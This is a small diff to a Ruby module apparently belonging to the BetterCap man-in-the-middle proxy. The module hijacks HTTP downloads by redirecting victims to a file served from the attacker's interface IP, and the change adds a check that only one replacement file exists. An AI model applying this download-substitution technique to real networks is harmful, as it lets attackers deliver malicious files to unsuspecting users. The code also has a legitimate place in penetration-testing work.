@@ -66,6 +66,7 @@ class DownloadHijack < BetterCap::Proxy::HTTP::Module
           BetterCap::Logger.info "   Renaming local".green + " #{@@thisExtension} ".upcase + "file to:".green + " #{@@hijackedFile}"
           BetterCap::Logger.info "   Redirecting from:".green + " http://#{request.host}#{request.path} " + "to".green + " http://#{BetterCap::Context.get.iface.ip}:#{@@hijackPort}/#{@@hijackedFile}\n\n"
           @@hijackFiles = Dir.glob(@@hijackPath + "*.#{@@thisExtension}")
+          raise BetterCap::Error, "#{@@hijackPath} contains more than one " + "#{@@thisExtension.upcase}" + " file." if @@hijackFiles[1]
           File.rename(@@hijackFiles[0], @@hijackPath + @@hijackedFile)
           @@hijackFileSize = File.read(@@hijackPath + @@hijackedFile).bytesize
           response.status = 302
